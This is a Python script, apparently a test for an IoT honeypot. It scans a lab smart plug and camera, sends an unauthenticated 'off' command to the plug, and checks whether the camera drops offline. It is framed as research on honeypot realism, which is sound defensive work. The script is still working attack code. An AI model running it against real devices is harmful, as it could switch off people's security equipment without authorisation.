# attacker.py
import socket
import time

PLUG_IP = '10.0.0.2'
PLUG_PORT = 1337
CAMERA_IP = '10.0.0.3'
CAMERA_PORT = 8080

def check_device(ip, port, device_name):
    """Tries to connect to a device to see if it's online."""
    print(f"[*] Checking if {device_name} ({ip}:{port}) is online...")
    try:
        with socket.create_connection((ip, port), timeout=2):
            print(f"[+] SUCCESS: {device_name} is online.")
            return True
    except (socket.timeout, ConnectionRefusedError):
        print(f"[-] FAILED: {device_name} is offline or not responding.")
        return False

def exploit_plug(ip, port):
    """Sends the 'off' command to the smart plug."""
    print(f"\n[*] Attempting to exploit Smart Plug at {ip}:{port}...")
    try:
        with socket.create_connection((ip, port), timeout=2) as s:
            s.sendall(b'off\n')
            response = s.recv(1024).decode()
            print(f"[+] EXPLOIT SUCCESS: Plug responded with: '{response.strip()}'")
            return True
    except (socket.timeout, ConnectionRefusedError):
        print("[-] EXPLOIT FAILED: Could not connect to the smart plug.")
        return False

if __name__ == '__main__':
    print("--- Starting Attack Simulation ---")
    
    # 1. Reconnaissance Phase
    print("\n--- PHASE 1: RECONNAISSANCE ---")
    plug_online = check_device(PLUG_IP, PLUG_PORT, "Smart Plug")
    camera_online = check_device(CAMERA_IP, CAMERA_PORT, "Smart Camera")
    
    if not plug_online or not camera_online:
        print("\n[!] One or more devices are offline. Aborting simulation.")
        exit()
        
    # 2. Exploitation Phase
    print("\n--- PHASE 2: EXPLOITATION ---")
    if exploit_plug(PLUG_IP, PLUG_PORT):
        print("\n[*] Waiting 5 seconds for power to 'cut' from the camera...")
        time.sleep(5)
    
        # 3. Verification Phase
        print("\n--- PHASE 3: VERIFICATION ---")
        print("[*] Verifying if the exploit was successful by checking the camera again.")
        camera_still_online = check_device(CAMERA_IP, CAMERA_PORT, "Smart Camera")
        
        if not camera_still_online:
            print("\n[✔] COORDINATED DECEPTION VERIFIED!")
            print("The camera is offline, just as expected after turning off its smart plug.")
        else:
            print("\n[✖] DECEPTION FAILED.")
            print("The camera is still online. The honeypot might be a simple, uncoordinated trap.")

    print("\n--- Attack Simulation Finished ---")
